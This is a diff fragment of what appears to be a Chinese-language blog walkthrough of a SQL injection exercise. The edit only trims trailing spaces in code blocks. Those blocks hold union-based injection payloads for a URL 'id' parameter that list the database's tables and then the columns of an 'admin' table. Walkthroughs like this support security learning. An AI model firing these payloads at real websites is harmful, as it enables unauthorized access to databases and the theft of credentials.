@@ -511,12 +511,12 @@
 </code></pre>
 <img title="null" src="/2022/03/09/happy/7.png" alt="null">
 
-<pre><code>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables   
+<pre><code>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables 
 wheretable_schema=database() -- + 查看表名
 </code></pre>
 <img title="null" src="/2022/03/09/happy/8.png" alt="null">
 
-<pre><code>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns  
+<pre><code>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns 
 wheretable_name=&#39;admin&#39; and table_schema=database() -- +
 查看列段
 </code></pre>
